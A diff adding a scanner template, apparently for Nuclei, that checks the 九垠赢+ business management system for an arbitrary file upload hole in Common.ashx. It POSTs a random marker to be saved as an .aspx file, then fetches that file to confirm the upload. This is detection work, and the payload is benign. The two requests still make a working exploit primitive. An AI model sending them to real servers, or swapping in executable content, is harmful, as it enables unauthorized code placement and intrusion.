@@ -1,0 +1,51 @@
+id: poc-yaml-jiuyin-plus-bms-common-ashx-anyfile-upload
+info:
+  name: 九垠赢+商业管理系统 Common.ashx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: "step-1"
+    method: POST
+    path:
+      - "{{BaseURL}}/System/Common.ashx?type=savefile&path={{t1}}.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="content";
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1"
+        part: body
+
+  - id: "step-2"
+    method: GET
+    path:
+      - "{{BaseURL}}/System/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
